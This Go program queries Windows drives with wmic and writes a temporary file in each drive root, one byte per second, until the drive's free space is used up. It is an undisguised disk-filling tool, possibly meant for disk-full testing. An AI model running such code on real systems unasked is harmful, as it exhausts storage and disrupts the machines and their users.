package main

import (
	"runtime"
	"strings"
	"os/exec"
	"os"
	"bytes"
	log "github.com/sirupsen/logrus"
	"strconv"
	"io"
	"path/filepath"
	"time"
	"fmt"
)

const filename = "_tmp.txt"

type pan string

var pf map[pan]int64

func win_run() {
	pf = make(map[pan]int64, 0)
	cmd := exec.Command("cmd", "/c", "wmic LOGICALDISK get name,size,freespace")
	o, err := cmd.Output()
	if err != nil {
		log.Printf("err:%s\n", err)
	}
	out := bytes.NewBuffer(o)
	for {
		line, err := out.ReadString('\n')
		if err != nil {
			if err == io.EOF {
				break
			}
			log.Errorf("err:%s\n", err)
			break
		}
		if strings.Contains(line, "Free") {
			continue
		}

		temp_slice := strings.Fields(line)
		//fmt.Println(temp_slice)
		if len(temp_slice) != 3 {
			continue
		}
		freesize, err := strconv.ParseInt(temp_slice[0], 10, 64)
		if err != nil {
			log.Errorf("err:%s\n", err)
		}
		pf[pan(temp_slice[1])] = freesize

	}

}

func loop_write(f *os.File,freesize int64)  {
	for i := int64(0); i < freesize; i++ {
		//ioutil.WriteFile(file,[]byte{65},0644)
		f.Write([]byte{65})
		time.Sleep(1*time.Second)
	}
}

func create_file_sub(file string,freesize int64) {
	fmt.Println(file)
	//create file
	if _,err:=os.Stat(file);err!=nil{
		if os.IsNotExist(err) {
			f,err1:=os.Create(file)
			if err1!=nil{
				log.Errorf("file err:%s\n",err)
			}
			loop_write(f,freesize)
		}else{
			f,err1:=os.OpenFile(file,os.O_WRONLY|os.O_APPEND,0777)
			if err1!=nil{
				log.Errorf("file err:%s\n",err)
			}
			loop_write(f,freesize)
		}

	}

}

func create_file() {
	for pan, freesize := range pf {
		file := filepath.Join(string(pan),"\\", filename)
		go create_file_sub(file, freesize)
	}
}

func main() {
	os_type := runtime.GOOS
	//fmt.Println(os)
	log.SetOutput(os.Stdout)
	log.SetLevel(log.DebugLevel) //级别
	log.SetFormatter(&log.TextFormatter{
		FullTimestamp: true})
	if strings.Contains(os_type, "win") {
		win_run()
		create_file()
	}
	select {}
}
